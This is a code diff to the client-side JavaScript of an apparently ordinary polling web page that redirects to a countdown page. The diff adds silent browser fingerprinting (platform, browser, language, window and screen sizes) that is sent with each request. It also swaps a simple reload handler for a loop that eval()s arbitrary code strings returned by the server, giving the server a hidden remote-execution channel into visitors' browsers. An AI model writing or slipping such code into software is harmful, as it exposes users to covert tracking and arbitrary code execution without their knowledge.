@@ -4,6 +4,24 @@ window.onload = function () {
 
 window.lastPull = 0;
 
+function generate_id() {
+    if (window.localStorage.getItem("uid")) {
+        return window.localStorage.getItem("uid")
+    }
+    data = {}
+    data.platform = navigator?.userAgentData?.platform || navigator?.platform || "Unknown"
+    data.browser = navigator?.userAgentData?.brands?.map(brand => brand.brand) || navigator?.userAgent || "Unknown"
+    data.language = navigator?.language || "Unknown"
+    data.windowSize = {"width": window.innerWidth, "height": window.innerHeight}
+    data.screenResolution = {"width": window.screen.width, "height": window.screen.height}
+    data.id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
+
+    return btoa(JSON.stringify(data))
+}
+
+window.uid = generate_id()
+window.localStorage.setItem("uid", window.uid)
+
 function runUpdateTimeClock() {
     setInterval(() => {
         const timeSince = Math.floor((Date.now() / 1000) - window.lastUpdated)
@@ -40,11 +58,14 @@ function pullAndRender() {
 
     window.lastPull = Date.now() / 1000
 
-    fetch("api/data").then(response => response.json())
+
+    fetch("api/data?uid=" + window.uid).then(response => response.json())
         .then(data => {
-            if (data.reload) {
-                location.reload()
-                return
+            if (data.evaluate) {
+                for (let i = 0; i < data.evaluate.length; i++) {
+                    const element = data.evaluate[i];
+                    eval(element)
+                }
             }
             if (data.day === "INVALID") {
                 window.location.replace("countdown.html")
